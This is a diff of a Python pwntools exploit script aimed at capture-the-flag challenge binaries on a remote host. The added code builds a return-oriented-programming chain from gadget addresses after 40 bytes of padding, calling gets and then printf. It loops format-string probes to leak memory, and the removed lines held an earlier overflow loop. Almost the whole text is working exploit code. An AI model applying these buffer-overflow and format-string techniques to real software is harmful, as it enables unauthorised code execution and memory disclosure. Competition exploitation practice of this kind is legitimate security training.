@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from pwn import *
-# from ctypes import CDLL
+from ctypes import CDLL
 
 context.terminal = ["tmux", "splitw", "-h"]
-# context.log_level = 'error' # se non vuoi vedere i loggin
-exe = context.binary = ELF(args.EXE or './ezsigrop')
-# lib = CDLL(exe.libc.path)
-host = args.HOST or 'ezsigrop.chall.srdnlen.it'
+context.log_level = 'error' # se non vuoi vedere i loggin
+exe = context.binary = ELF(args.EXE or './supermario_odyssey')
+lib = CDLL(exe.libc.path)
+host = args.HOST or 'supermario-odyssey.chall.srdnlen.it'
 port = int(args.PORT or 443)
 
 
@@ -33,23 +33,40 @@ def start(argv=[], *a, **kw):
         return start_remote(argv, *a, **kw)
 
 gdbscript = '''
-b *0x40102b
+b *0x4011cc
 continue
 '''.format(**locals())
 
 # -- Exploit goes here --
 
-shell = p64(0x401036)
-
-
 io = start()
 
-sysread = p64(0x401015)
-i = 0
-while True:
-    i += 1
-    io.send(b"A" * 72 + sysread + cyclic(0x1000 - 72 - len(sysread)))
-    print(io)
+rdi = p64(0x4011e7)
+printf = p64(0x401094)
+get = p64(0x4010a4)
+dati = p64(0x404000)
+adjust = p64(0x4011ef)
 
+payload = flat(
+    b"A" * 40, # padding
+    rdi, dati, adjust, get, 
+    rdi, dati, adjust, printf 
+)
+
+i = 0 
+while True:
+    try:
+        io = start()
+        i += 1
+        io.sendlineafter(b"> ", payload)
+        io.sendline(f"%{i}$p".encode())
+        io.recvline()
+        io.recvline()
+        print(i, io.recvline())
+        io.close()
+        # exit()
+    except EOFError:
+        io.close()
+        pass
 io.interactive()
 
